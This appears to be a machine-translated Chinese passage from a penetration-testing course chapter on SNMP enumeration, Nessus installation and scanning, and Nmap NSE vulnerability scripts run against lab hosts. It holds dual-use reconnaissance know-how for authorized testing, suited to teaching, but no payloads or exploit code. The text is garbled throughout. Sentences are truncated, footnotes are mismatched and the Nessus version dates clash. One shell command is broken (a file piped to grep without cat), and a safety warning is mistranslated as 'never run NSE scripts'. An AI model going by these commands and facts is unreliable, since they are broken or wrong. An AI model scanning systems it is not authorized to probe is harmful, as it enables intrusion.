+```
+kali@kali:~ snmpwalk -c public -v1 10.11.11.50 1.3.6.1.2.1.25.6.3.1.2
+
+iso.3.6.1.2.1.25.6.3.1.2 = STRING: "Liveupdate 3.3 (Symantec Corporation)"
+
+iso.3.6.1.2.1.25.6.3.1.2 = STRING: "WmsServer 2.5"
+
+iso.3.6.1.2.1.25.6.3.1.2 = STRING: "VMware Tools"
+
+iso.3.6.1.2.1.25.6.3.1.2 = STRING: "Microsoft Visual C++ 2008 Redistributable - x86 (9.0.3744)"
+
+iso.3.6.1.2.1.25.6.3.1.2 = STRING: "Microsoft Visual C++ 2012 Redistributable (x86) - 11.0.61830"
+```
+
+
+
+列表 273 - 使用 `snmpwalk` 枚举已安装软件
+
+## 7.6.6 练习
+
+- 1. 使用 `onesixtyone` 扫描你的网络以识别任何 SNMP 服务器。
+- 2. 使用 `snmpwalk` 和 `snmp-check` 收集发现目标的信息。
+
+## 7.7 总结
+
+对于任何情况，永远不存在一种“最佳”工具，因为 Kali 中的许多工具功能是重叠。最好的方法总是尽可能熟悉许多工具，学习它们的细微差别，并在可能的情况下衡量结果以了解背后正在发生什么。在某些情况下，“最佳”工具是经验丰富的从业人员所持有的工具。
+
+## 8. 漏洞扫描
+
+漏洞发现是任何安全评估中不可或缺的一部分。虽然我们更倾向于利用我们在安全审计中的知识和经验进行手动、专门化的任务，但在适当的场景下，自动化漏洞扫描器同样是无价之。在本模块中，我们将提供自动化漏洞扫描的概述，讨论其各种考虑因素，并重点关注 Nessus 和 Nmap 这两个不可或少的工具。
+
+## 8.1 漏洞扫描概述与考虑因素
+
+在深入研究工具之前，我们必须花时间讨论漏洞扫描流程，概述关于自动扫描和手动扫描的基本考虑因素，并讨论关键的细之处和最佳实践。
+
+### 8.1.1 漏洞扫描是如何工作的
+
+1. 检测目标是否已上线并运行。
+2. 根据配置进行全端口或部分端口扫描。
+3. 使用常用的指纹技术识别操作系统。
+4. 尝试使用常用技术（如横幅抓取 banner grabbing、服务行为识别或文件发现）来识别正在运行的服务。
+5. 执行签名匹配过程以发现漏洞。
+
+请注意，这个过程基本上反映了我们在手动评估期间所做。作为渗透测试人员，我们可能会在脑中执行某种签名匹配过程。例如，我们可能记得在现场使用的某个特定版本的应用程序容易受到远程漏洞攻击。然而，自动化扫描器是在独特漏洞签名¹²⁹ 的帮助下执行此操作的。
+
+签名匹配过程的一部分，许多扫描器使用横幅抓取，这是一种简单的技术，即获取并分析在与应用程序交互期间生成的文本字符串。某些应用程序会生成特定的横幅，例如 OpenSSH，它可能会返回“SSH-2.0-OpenSSH_7.9p1 Debian”以精确确定应用程序版本；而其他程序，例如 Apache Tomcat 服务器 4.1.x 到 8.0.x，则返回通用的 HTTP 请求头“Apache-Coyote/1.1”。自然地，更具体的头部和横幅使扫描器更容易确定应用程序版本，并以此准确地检测潜在漏洞。
+
+某些漏洞扫描器可以配置为检测到漏洞后进行利用。这可以减少误报的概率，但也增加了服务崩溃的风险。请务必仔细检查扫描器的选项。
+
+大多数自动化扫描器在签名匹配过程中会检查各种其他目标信息。尽管如此，即使是强匹配也不保证存在漏洞。相比之下，这种自动化扫描器可能会产生相当多的误报²²⁰，以及由于签名不匹配而忽略漏洞的漏报²²¹。误报和漏报也因为回移植（backporting）²²² 而发生，包管理器会将软件安全补丁“回滚”到旧版本。回移植可能会导致扫描器在漏洞实际上已修复时仍将其标记为漏洞版本。
+
+正因如此，我们应该尽可能仔细检查并手动审查扫描器的结果。鉴于不断变化且复杂的科技格局，漏洞可能会出现在意想不到的地方。作为市面上最优秀的商业扫描器之一，我们并不完美。然而，通过在每次任务之前更新签名数据库，我们确保扫描器有最大的机会发现最新的漏洞。
+
+这种签名匹配过程非常高效，比完全手动审查要快得多，使得自动化漏洞扫描器成为评估期间首轮扫描极极选择，也是手动审查的完美伙伴。
+
+了解计划在现场使用的任何自动化工具的内部原理是一项极具价值的练习。这不仅有助于我们配置工具并妥善消化结果，还将帮助我们理解必须通过手动专业知识来克服的局限性。
+
+### 8.1.2 手动扫描与自动化扫描
+
+在评估期间，我们应该结合手动和自动扫描技术，但平衡会随着经验的增加而变得明显。
+
+让我们讨论一下手动和自动扫描的主要优缺点，以帮助在评估期间取得适当平衡。
+
+对目标网络进行手动审查不可避免地是耗资源且耗时的。由于这种方法严重依赖人工交互和重复性任务，它也可能出现错误，忽略某些漏洞。然而，特别是红队对抗（red-teaming）²²³，需要手术般的精确度和极小的网络足迹，以便尽可能长时间不被发现。在这些情况下，使用自动化扫描器并不是最佳方法。此外，手动分析允许发现复杂的逻辑类漏洞，而这些漏洞使用任何类型的自动化扫描器都很难发现。
+
+然而，在处理具有传统安全评估相关典型时间限制的大型任务时，自动化漏洞扫描器是无价的。无论是对整个网络使用通用扫描器还是针对单个专用主机，我们都能在短得内建立基准。这些基准允许我们验证易于检测的漏洞，或者至少有助于理解目标的整体安全态。
+
+### 8.1.3 互联网扫描与内部扫描
+
+我们到目标网络连接的速度不仅决定了扫描器可用的原始带宽，还取决于其他因素，如每个主机的主机数量。这意味着我们可以对本地连接的主机更快地进行具侵入性和全面的扫描。然而，我们必须时刻留意流量，意识到旧设备可能会受到高强度扫描的不利影响。为了获得最佳结果，请考虑之前模块中端口扫描讨论建立的指南。
+
+我们在网络中的位置也会影响可见性。例如，防火墙或入侵防御系统（IPS）可能会拦截我们的流量并生成安全警报。最后，我们的位置会影响目标。例如，典型的漏洞扫描器会尝试通过 ping 或 ARP 扫描来发现目标¹²⁴。
+
+我们需要时间来彻底理解目标网络，正如我们所说的，了解你的工具以及它们在后台如何运作是非常重要的。
+
+### 8.1.4 身份验证与非身份验证扫描
+
+大多数扫描器都可以配置为运行身份扫描，即扫描器登录目标。在大多数情况下，身份扫描使用特权用户账户以获得系统的最佳可见性。
+
+要对 Linux 目标运行身份扫描，我们只需启用 Linux 目标上的 `SSH` 服务并为扫描器配置有效凭据。大多数扫描器将使用此访问权限来检查包版本和配置。
+
+Windows 身份验证会带有具有远程管理权限的域或本地账户凭据生成 Windows 工具（`WMI`）²⁶。即使配置了 `WMI`，其他因素也可能 `UAC`¹²⁷ 和防火墙设置阻止验证。一旦正确配置访问，大多数扫描器将分析系统配置、注册表设置以及应用程序和系统级。它们还会检查 Program Files 目录中的文件以及 Windows 文件夹中的可执行文件和 DLL，所有目的是尝试检测潜在的漏洞软件。
+
+身份扫描会产生大量的额外信息并产生更准确的结果，但是以更长的扫描时间为代价。虽然身份扫描可以在渗透测试中使用（例如使用发现的凭据），但它更多地用于补丁管理过程。
+
+## 8.2 使用 Nessus 进行漏洞扫描
+
+当我们超越基础阶段并开始研究工具时，我们将首先关注 Nessus，这是一种流行的漏洞扫描器，在本文编写时拥有惊人的 130,000 个插件²²⁸（漏洞检查）。虽然最初是作为开源开发的，但在 2005 年源
+
+---
+²²⁰ (CGISecurity, 2008), https://www.cgisecurity.com/questions/falsepositive.html
+²²¹ (CGISecurity, 2008), https://www.cgisecurity.com/questions/alsenegative.html
+²²² (Red Hat, 2020), https://access.redhat.com/security/updates/backporting
+²²³ (CGISecurity, 2008)
+²²⁸ (Tenable, 2020), https://www.tenable.com/products/nessus
+¹²⁹ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/wmidk/about-wi
+¹²⁶ (2018)
+¹²⁴ (Tenable, 2019), https://docs.tenable.com/Nessus/DiscoverySettings.html#HostDiscovery
+¹²⁵ (Nmap, 2019), https://nmap.org/book/man-host-discovery.html
+¹²⁷ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-controls
+
+# 攻击性安全
+
+已关闭。²²⁹ 向闭源模型的转变导致了开源项目的分叉，并发布了 OpenVAS²³⁰
+
+市场上有许多商用和开源的漏洞扫描器，它们各有优缺点。然而，Nessus 是一个相当的行业标准，免费的“Essentials”（基础）版本允许我们扫描多达 16 个 IP 地址。它让我们深入了解如何在没有时间限制或约束的情况下使用完整的商业版本。本节讨论的总体概念通常适用于任何其他商用扫描器，正如 Nessus 一样。
+
+## 8.2.1 安装 Nessus
+
+在开始安装之前，我们应该更新 Kali 的包列表并将现有软件包升级到最新版本：
+
+```
+kali@kali:~$ sudo apt update && sudo apt upgrade
+```
+
+
+
+### 列表 274 - 更新包列表并升级软件包
+
+虽然 Kali 存储库中没有 Nessus，但我们可以从 Tenable 网站手动下载为 Kali 准备的 64 位 `.deb` 文件：`https://www.tenable.com/downloads/nessus.`。
+
+我们可以通过点击下载页面上的“Checksum”（校验和）（图 44）查看 SHA256 校验值，并使用 `sha256sum` 验证下载文件的校验和。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_209_0.png)
+
+²²⁹ (Renai LeMay, 2005), https://www.cnet.com/news/nessus-security-tool-closes-its-source/
+²³⁰ (Greenbone Networks, 2019), http://www.openvas.org
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+| | | | | | | |
+|---|---|---|---|---|---|
+| Nessus-6.8.0-Win32.msi | Windows 7, 8, 10 (32位) | 89.7 MB | 2013年8月 | 校验和 |
+| Nessus-6.8.0-x64.msi | Windows Server 2008, Server 2008 R2*, Server 2012, Server 2012 R2, 8, 10, Server 2016 (64位) | 95.1 MB | 2013年8月 | 校验和 |
+| Nessus-6.8.0.dmg | macOS (10.8 - 10.14) | 84.6 MB | 2013年8月 | 校验和 |
+| Nessus-6.8.0-amd64_64.rpm | Amazon Linux | MD5: d6f6ad3d792e2432742fc680199499a SHA256: 71957c2d0e6b884ae7609f58a3199225bbd2c3d8b35af532b23849 | 2013年8月 | 校验和 |
+| Nessus-6.8.0-debian_amd64.deb | Debian 6, 7 / Kali Linux 1, 2013.1_AMD64 | 77.2 MB | 2013年8月 | 校验和 |
+| Nessus-6.8.0-debian6_i386.deb | Debian 6, 7, 9 / Kali Linux 1, 2013.1_i386(32位) | 75.7 MB | 2013年8月 | 校验和 |
+
+图 44: Nessus 下载与校验和
+
+```
+kali@kali:~/nessus sha256sum Nessus-X-X.X.deb
+
+34199e8f7bb70c150db2b224952722ce2d131c5acd1c0c1dae6851a32892d399d Nessus-X-X.X.deb
+```
+
+### 列表 275 - 验证校验和
+
+运行 `sha256sum` 后显示的数值与网站上显示的值应该匹配。请注意，此校验和取决于版本，可能与上述图中显示的内容不匹配。
+
+由于我们的校验和匹配，我们可以使用 `apt` 安装该软件包：
+
+```
+kali@kali:~/nessus sudo apt install ./Nessus-X-X.X.deb
+
+Preparing to unpack .../kali/nessus/Nessus-X-X.X.deb
+
+Unpacking nessus (X.X.X) ...
+
+Setting up nessus Scanner Core Components...
+
+你可以通过输入 `/etc/init.d/nessus start` 来启动 Nessus
+
+然后前往 `https://kali:8834/` 配置你的扫描器
+```
+
+### 列表 276 - Nessus 安装
+
+软件包安装后，我们可以启动 `nessusd` 服务：
+
+```
+kali@kali:~/nessus sudo /etc/init.d/nessusd start
+
+Starting Nessus :
+```
+
+
+
+```
+列表 277 - 启动 Nessus
+```
+
+一旦 Nessus 运行，我们就可以使用浏览器导航到 `https://localhost:8834`。我们将看到一个证书错误，指示存在未知的证书颁发者，但由于使用了自签名证书，这是预期的。
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_211_0.png)
+图 45: Nessus 显示证书错误
+
+要接受自签名证书，请点击 *Advanced*（高级）和 *Exception*（异常）...
+
+![](img/f99f528ca9845f4c256ce54e882b1345_211_1.png)
+图 46: 为无效证书添加异常
+
+当安全异常弹出窗口打开时，我们可以点击 *Confirm Security Exception*（确认安全异常）来接受证书：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_212_0.png)
+# 添加安全异常
+
+![](img/f99f528ca9845f4c256ce54e882b1345_212_1.png)
+图 47: 确认安全异常
+
+一旦页面加载，我们将收到提示选择 Nessus 的提示。为了我们的目的，我们将部署 Essentials。这是通过从列表中选择并点击 Continue 完成的
+
+![](img/f99f528ca9845f4c256ce54e882b1345_212_2.png)
+图 48: 选择 Essentials
+
+接下来，我们将收到提示请求 Nessus 激活码。填写表单并将激活码发送到我们的地址。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_213_0.png)
+图 49: 请求激活码
+
+收到激活码后，我们可以将其输入 Nessus 并点击 Continue。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_213_1.png)
+图 50: 激活 Nessus
+
+一旦 Nessus 激活，我们将收到提示创建本地账户：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_214_0.png)
+图 51: 创建本地账户
+
+最后，我们必须下载并编译插件。这可能需要大量时间。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_214_1.png)
+图 52: 更新 Nessus
+
+## 8.2.2 定义目标
+
+一旦 Nessus 安装完成，就是设置我们第一次扫描了。要开始，我们只需点击 New Scan 按钮。Nessus 支持多种扫描类型，包括：
+
+- **Basic Network Scan**（基础网络扫描）：适用于目标类型的通用扫描。
+- **Credential Audit**（凭据审计）：枚举缺失补丁的扫描。
+- **Web Application Tests**（Web 应用测试）：发现 Web 漏洞。
+- **Spectre and Meltdown**：针对 Spectre³¹ 和 Meltdown³² 漏洞的专用扫描。
+
+我们建议调查这些扫描类型，但对于介绍章节，我们将重点关注 *Basic Network Scan*。
+
+²³¹ (Wikipedia, 2020), https://www.wikipedia.org/wiki/Spectre_(security_vulnerability)
+²³² (Wikipedia, 2019), https://www.wikipedia.org/wiki/Meltdown_(security_vulnerability)
+
+# 扫描模板
+
+![](img/f99f528ca9845f4c256ce54e882b1345_216_0.png)
+图 54: 选择基础网络扫描
+
+这将显示扫描设置界面，包含两个必需参数：扫描名称和目标列表。Nessus 支持将 IP 地址、IP 范围或逗号分隔的 FDN 或 IP 列表作为目标。
+
+对于示例，我们将扫描 PWK Labs 中的 Gamma ，其 IP 地址为 10.11.1.73。在 Name 字段中输入“Gamma - Basic”，并在 Targets 字段中输入 IP 地址：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_217_0.png)
+图 55: 配置 Gamma 扫描
+
+## 8.2.3 配置扫描定义
+
+在此场景中，我们选择了 Basic Network Scan 模板定义，它像所有其他模板一样，预配置了默认设置。然而，这些默认设置可能并不是我们所需要的，我们必须考虑我们的环境、时间限制以及被扫描的目标。配置 Basic Network Scan 模板时需要考虑的一些因素包括：
+
+- 我们的目标位于内部网络还是公开访问？
+2. 扫描器是否应该尝试破解用户凭据？
+3. 扫描器应该扫描所有 TCP 和 UDP 端口还是仅扫描常用端口？
+4. 扫描器应该运行哪些检查，避免哪些检查？
+5 扫描器应该运行身份验证扫描还是非身份验证扫描？
+
+对于此次扫描，我们希望对所有端口运行初始基础端口扫描。默认情况下，Basic Network Scan 只扫描常用端口。要更改此，请点击 Settings 标签左侧的 Discovery 链接。
+
+# 新扫描 / 基础网络扫描
+
+< 返回到扫描模板
+
+| 设置 | 凭据 | 插件 |
+|---|---|---|
+| 基础 | 名称：Gamma - 基础 | |
+| 通用 | 描述： | |
+| 计划 | | |
+| 通知 | | |
+| 发现 | 文件夹：我的扫描 | |
+| 目标: 10.11.1.73 | 添加文件 | |
+
+图 56：访问“发现”设置
+
+在 **扫描类型** 下拉菜单中，我们将值从 **端口扫描**（常用端口）更改为“自定义”。
+
+# 新扫描 / 基础扫描模板
+
+< 返回到扫描模板
+
+![](img/f99f528ca9845f4c256ce54e882b1345_219_0.png)
+
+图 57：配置扫描器使用自定义端口配置
+
+这将在“发现”项下添加额外的配置。接下来，我们将点击点击“发现”和“端口扫描”来配置端口范围。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_220_0.png)
+
+使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_220_1.png)
+
+图 58：选择新的“端口扫描”选项
+
+在“端口扫描”部分，我们将把端口扫描范围设置为“0-65535”，以扫描所有端口：
+
+# 新扫描 / 基础网络扫描
+
+< 返回到扫描模板
+
+![](img/f99f528ca9845f4c256ce54e882b1345_220_2.png)
+
+图 59：配置扫描器扫描所有端口
+
+在这种场景下，我们选择了一个扫描所有 TCP 端口但不扫描 UDP 端口的扫描定义。虽然这会提高扫描速度，但我们可能会错过目标主机上运行的关键服务。在执行过程中，在配置端口扫描选项时，我们必须权衡目标网络的稳定性、目标的范围、执行持续以及许多其他因素。
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。221
+
+在配置扫描定义期间，我们没有配置任何凭据，这意味着此扫描将在未身份验证的情况下运行。此外，我们接受了“基础网络扫描”下的默认设置，这意味着不会启用用户凭据的暴力破解。如果我们查看“基础网络扫描”下的其他选项，可以验证扫描将对目标进行通用检查，这与 Spectre 和 Meltdown 等包含特定漏洞检查的模板不同。请记住，配置配置的扫描在网络流量层面上是极易被察觉的，因为它会扫描所有端口并搜索所有适用的漏洞。
+
+现在，我们已经完全审查了所有配置选项，并理解（至少在高级层面上）了扫描器将要做什么，我们可以继续运行我们的第一次扫描了。
+
+## 8.2.4 使用 Nessus 进行未身份验证扫描
+
+当我们准备好运行第一次未身份验证扫描时，点击“保存”（*注：此处原文为Save*）旁边的箭头，然后点击“启动”：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_221_0.png)
+
+最初，扫描状态将为“运行中”（*Running* 图 61）。
+
+我的扫描
+
+![](img/f99f528ca9845f4c256ce54e882b1345_221_1.png)
+
+一旦扫描完成，状态将变为“已完成”（*Completed* 图 62）。
+
+使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_222_0.png)
+
+我的扫描
+
+![](img/f99f528ca9845f4c256ce54e882b1345_222_1.png)
+
+图 62：进行中的扫描状态
+
+扫描时间将根据许多因素变化，包括扫描配置和网络速度。
+
+从“我的扫描”界面，我们可以点击扫描名称“Gamma - 基础”，以显示扫描期间发现的主机列表以及潜在漏洞的明细。
+
+## Gamma - 基础
+
+![](img/f99f528ca9845f4c256ce54e882b1345_222_2.png)
+
+图 63：查看扫描概览
+
+无论我们扫描一个还是多个主机，都可以点击 IP 地址或主机名来显示该目标发现的漏洞，如图 64 所示：
+
+PWK 2.0 | 版权 © Offensive Security Ltd. 保留所有权利 | 223
+
+# Offensive SECURITY
+使用 Kali Linux 2.0 进行渗透测试
+
+## Gamma - 基础 / 10.11.1.73
+
+< 返回到主机
+
+漏洞 39
+
+| 级别 | 名称 | 家族 | 数量 |
+|---|---|---|---|
+| 中等 (MEDIUM) | PHP (多个问题) | CGI 滥用 | 26 |
+| 中等 (MEDIUM) | Microsoft Windows (多个) | Windows | 5 |
+| 中等 (MEDIUM) | Apache HTTP Server | Web 服务器 | 14 |
+| 中等 (MEDIUM) | SNMP (多个问题) | SNMP | 7 |
+| 中等 (MEDIUM) | SNMP (多个问题) | SNMP | 7 |
+| 中等 (MEDIUM) | HTTP (多个问题) | Web 服务器 | 4 |
+| 中等 (MEDIUM) | Microsoft Windows (多个) | Windows | 4 |
+| 中等 (MEDIUM) | 远程 Windows | Windows | 1 |
+
+图 64：发现的漏洞
+
+我们可以根据严重性和可利用性来过滤这些漏洞。为了显示可能导致损害的漏洞，我们可以点击“过滤器”并将其设置为“是”（*true*）。一旦配置，我们可以：![](img/f99f528ca9845f4c256ce54e882b1345_223_0.png)
+
+图 65：带有漏洞利用的扫描
+
+PWK 2.0 渗透
+
+使用 Kali Linux 2.0 进行渗透测试
+
+漏洞 7
+
+| | 名称 | 家族 | 数量 |
+|---|---|---|---|
+| 严重 (CRITICAL) | MS11-030: DNS Could RCE | Windows | 1 |
+| 高 (HIGH) | Apache 2.4.x < 10 | Web 服务器 | 1 |
+| 高 (HIGH) | Apache 2.4.x < 25 httpoxy | Web 服务器 | 1 |
+| 高 (HIGH) | MS12-020: 远程桌面 | Windows | 1 |
+| 中等 (MEDIUM) | Apache 2.4.x < 28 OptionsBle | Web 服务器 | 1 |
+| 中等 (MEDIUM) | Apache 2.4.x < 39 | Web 服务器 | 1 |
+| 中等 (MEDIUM) | SSL 使用 | 通用 | 1 |
+
+图 66：禁用分组
+
+这种输出非常有用，我们可以点击表格顶部的图标来禁用“分组”。这将按严重程度显示漏洞。
+
+| 级别 | 名称 | 家族 | 数量 |
+|---|---|---|---|
+| 中等 (MEDIUM) | Microsoft Windows (多个) | Windows | 2 |
+| 中等 (MEDIUM) | Apache HTTP Server (多个) | Web 服务器 | 4 |
+| 中等 (MEDIUM) | SSL 使用 | 通用 | 1 |
+
+图 67：禁用分组
+
+这种输出非常完美，因为它按严重程度首先显示高风险漏洞。
+
+使用 Kali Linux 2.0 进行渗透测试
+
+OFFENSIVE SECURITY
+www.offensive-security.com
+
+漏洞 7
+
+| | 名称 | 家族 | 数量 |
+| 严重 (CRITICAL) | MS11-030: DNS Could RCE | Windows | 1 |
+| 高 (HIGH) | Apache 2.4.x < 10 | Web 服务器 | 1 |
+| 高 (HIGH) | Apache 2.4.x < 25 httpoxy | Web 服务器 | 1 |
+| 高 (HIGH) | MS12-020: 远程桌面 | Windows | 1 |
+| 中等 (MEDIUM) | Apache 2.4.x < 28 OptionsBle | Web 服务器 | 1 |
+| 中等 (MEDIUM) | Apache 2.4.x < 39 | Web 服务器 | 1 |
+| 中等 (MEDIUM) | SSL 使用 | 通用 | 1 |
+
+图 68：漏洞列表
+
+当然，某些条目可能是误报，这就是为什么必须查看扫描数据并手动检查扫描结果。
+
+### 8.2.4.2 练习
+
+1. 按照上面的步骤创建你自己的未身份验证扫描。
+2. 在打开 Wireshark 的情况下运行扫描并识别完成扫描的步骤。
+3. 查看扫描结果。
+
+### 8.2.5 使用 Nessus 进行身份验证扫描
+
+通过执行身份验证扫描，我们可以生成更详细的信息并减少误报，这需要有效的目标凭据。为了演示身份验证扫描的价值，我们将运行我们的。请记住，作为渗透测试人员，在没有明确许可和与目标网络管理员沟通的情况下，我们不会执行身份验证扫描，因为存在意外中断生产系统的风险。
+
+开始，我们将点击“新建扫描”（*New Scan*）按钮开始扫描。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_226_0.png)
+
+使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_226_1.png)
+
+图 69：创建扫描
+
+尽管 Nessus 模板接受用户凭据，我们将使用“凭据补丁审计”扫描模板，该模板预先配置对目标执行本地安全检查。此模板不仅会扫描缺失的操作系统补丁，还会扫描可能受到权限提升等向量攻击的应用程序。接下来，我们将点击“凭据补丁审计”卡片：
+
+# 扫描模板
+
+< 返回到扫描
+
+![](img/f99f528ca9845f4c256ce54e882b1345_226_2.png)
+
+图 70：选择“凭据补丁审计”扫描
+
+再次，我们将为扫描提供名称并设置目标。注意你的 Debian 客户端 IP 会不同。请参考学生控制面板获取正确的 Debian 客户端 IP。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_227_0.png)
+
+# 新扫描 / 凭据补丁审计
+
+< 返回到扫描模板
+
+![](img/f99f528ca9845f4c256ce54e882b1345_227_1.png)
+
+图 71：身份验证扫描的基本配置
+
+接下来，我们点击“凭据”（Credentials）选项卡和 SSH 类别。在“身份验证方法”（Authentication method）下拉菜单中，我们选择“密码”（password），将用户名设置为“root”，并为我们的 Debian 客户端提供密码。
+
+正确的配置可以在图 72 中所示：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_227_2.png)
+
+图 72：输入 SSH 凭据
+
+PWK 2.0
+Copyright © Offensive Security Ltd. All rights reserved.
+
+虽然我们在这个示例中仅使用 SSH 配置，但我们可以通过点击“类别”（Categories）下拉菜单并选择“全部”来轻松查看 Nessus 支持的其他身份认证机制。
+
+最后，我们可以点击“保存”（Save）旁边的箭头，然后点击“启动”（Launch）扫描：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_228_0.png)
+
+与未身份扫描一样，扫描正在进行，状态报告为“正在运行”（Running）。一旦扫描达到“完成”（Completed）状态，我们可以点击扫描名称打开主机列表，并点击 Debian 的 IP。这将显示在 Debian 目标上可能被利用的发现漏洞列表：
+
+# Debian - Auth / 10.11.10.131
+
+< 返回到主机
+
+| | | 名称 | 族 | 计数 | |
+|---|---|---|---|---|---|
+| | 严重 | Debian DSA-4286-1: curl - security upd... | Debian 本地安全检查 | 1 | |
+| | 高 | Debian DSA-4172-1: perl - security upd... | Debian 本地安全检查 | 1 | |
+| | 高 | Debian DSA-4188-1: linux - security up... | Debian 本地安全检查 | 1 | |
+| | 高 | Debian DSA-4196-1: linux - security up... | Debian 本地安全检查 | 1 | |
+| | 高 | Debian DSA-4199-1: firefox-ser - secur... | Debian 本地安全检查 | 1 | |
+
+图 74：查看结果
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved.
+
+![](img/f99f528ca9845f4c256ce54e882b1345_229_0.png)
+
+在此视图中，请注意漏洞是带有补丁编号列出的。这是因为在扫描的“发现”阶段，Nessus 确定目标正在运行 Debian 操作系统并执行了 Debian 本地安全检查插件。²³ 我们可以看到身份验证扫描是成功的，因为扫描器现在可以看到未远程暴露的漏洞应用程序（例如 Firefox）。
+
+## 8.2.5.2 练习
+
+- 1. 按照上述步骤为你的 Debian 客户端创建自己的身份验证扫描。
+- 2. 审查扫描结果。
+
+## 8.2.6 使用 Ideal Nessus 插件进行扫描
+
+默认情况下，Nessus 在运行默认模板时会在后台启用许多插件。这在许多场景中非常有用，我们也可以对选项进行微调，例如运行单个插件。我们可以使用此功能来验证发现的结果，或快速发现特定环境中的所有漏洞。
+
+对于此示例，我们将针对实验室中的“Beta” 主机使用“NFS 导出共享信息泄露”²⁴ 插件。我们可以使用此插件从 RPC 服务器（端口 111）收集信息，并验证目标是否正在导出任何共享。
+
+要运行单个插件的扫描，我们将再次使用“新扫描”（New Scan）：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_229_1.png)
+
+图 75：创建扫描
+
+这次，我们将使用“高级扫描”（Advanced Scan）模板。与之前使用的“基础网络扫描”和“凭据补丁审计”模板不同，高级扫描模板不为扫描配置提供建议。该模板提供了一组“高级”默认值，这些值通常在其他模板中是隐藏或不可用的。注意，高级扫描允许我们选择单个插件，这一选项在大多数模板中都是不可用的。
+
+> ²³ (Tenable, 2020), https://www.tenable.com/plugins/nessus/families/Debian%20Local%20Security%Checks
+> ²³⁴ (Tenable, 2020), https://www.tenable.com/plugins/nessus/11356
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved.
+
+要使用此模板，点击“高级扫描”卡片并配置名称和目标：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_230_0.png)
+
+图 76：配置单个扫描
+
+| 描述 | |
+|---|---|
+| 文件夹 | |
+| 目标 | 10.11.10.131 |
+| 设置 | |
+
+# 攻击性安全
+www.offensecurity.com
+
+使用 Kali Linux 进行渗透测试 2.0
+
+# Beta - 个人/插件 #11356
+< 返回漏洞列表
+
+漏洞 3
+
+# 严重 NFS 导出的共享信息泄露
+
+## 描述
+远程服务器导出的至少一个 NFS 共享可以被扫描主机挂载。攻击者可能利用此读取（并可能写入）远程上的文件。
+
+## 解决方案
+在远程主机上配置 NFS，使得只有授权的主机可以挂载其远程共享。
+
+## 输出
+```
+
+
+
+可以挂载的以下 NFS 共享：
+
+- `/hose`
+
+- `/home` 的内容：
+
+  - `jenny`
+  - `joe45`
+  - `john`
+  - `marcus`
+  - `ryuu`
+
+| 端口 | 主机 |
+| :--- | :--- |
+| 2049/udp/nfs_nacl | 192.168.1.113 |
+
+图 82：查看结果。
+
+注意扫描还生成了两个额外的信息插件输出。这些包含了关于扫描的细节和 SYN 扫描的结果。
+
+## 8.2.6.1 练习
+
+- 1. 按照上述步骤对 Beta 创建你自己的个人扫描。
+- 2. 在个人扫描期间运行 `Wireshark` 或 `tcpdump`。`Nessus` 还扫描了哪些端口？为什么 `Nessus` 不扫描其他端口？
+- 3. 审查扫描结果。
+
+## 8.3 使用 Nmap 进行漏洞扫描
+
+除了 `Nessus` 之外，我们还可以使用 Nmap 脚本引擎 (`NSE`)² 来执行自动化漏洞扫描。虽然 `NSE` 不是一个全功能的漏洞扫描器，但它拥有一个相当不错的脚本库，可用于检测和验证漏洞。`NSE` 脚本用 `Lua`³ 编写（`Nmap, 2019`），`https://nmap.org/book/nse.html`），功能范围涵盖了从破解、身份验证到检测和利用漏洞等方面。为了这些目的，我们将关注“vuln”和“exploit”类别中的脚本，因为前者检测漏洞，而后者尝试利用这些漏洞。
+
+然而，这些类别之间存在重叠，且“vuln”脚本本质上可能运行了精简版的漏洞利用程序。因此，脚本还被归分为“安全”（safe）或“侵入性”（intrusive），我们在执行后者时应小心，它们可能会导致远程服务崩溃或攻陷目标。
+
+> 永远不要运行 `NSE` 脚本。在运行之前花时间检查它们以理解你在做什么，并尽可能在你的目标上进行测试。
+
+在 Kali 上，`NSE` 脚本可以在 `/usr/share/nmap/scripts/` 目录下找到。打开任何 `*nse` 文件* 都可以以简单的人类可读的格式显示每个脚本的源码。花时间审查一些 `NSE` 脚本，以熟悉这种格式以及这些脚本执行的检查类型。
+
+此文件夹还包含一个 `script.db`，作为所有 Nmap 脚本的索引。它还对每个 Nmap 脚本进行了分类。例如，我们可以使用该文件通过 `grep` 查找“vuln”和“exploit”类中的脚本，如列表 278 所示。
+
+```
+kali@kali~$ cd /usr/share/nmap/
+kali@kali~$ head -n 5 script.db
+Entry { filename = "arcasd-info.nse", categories = { "discovery", "safe", } }
+Entry { filename = "address-info.nse", categories = { "default", "safe", } }
+Entry { filename = "afp-brute.nse", categories = { "brute", "intrusive", } }
+Entry { filename = "afp-ls.nse", categories = { "discovery", "safe", } }
+Entry { filename = "afp-path-vuln.nse", categories = { "exploit", "intrusive", "vuln", }
+kali@kali~$ /usr/share/nmap/script.db | grep "vuln|exploit"
+Entry { filename = "afp-path-vuln.nse", categories = { "exploit", "intrusive", "vuln", } }
+Entry { filename = "clamav-exoit.nse", categories = { "exploit", "vuln", } }
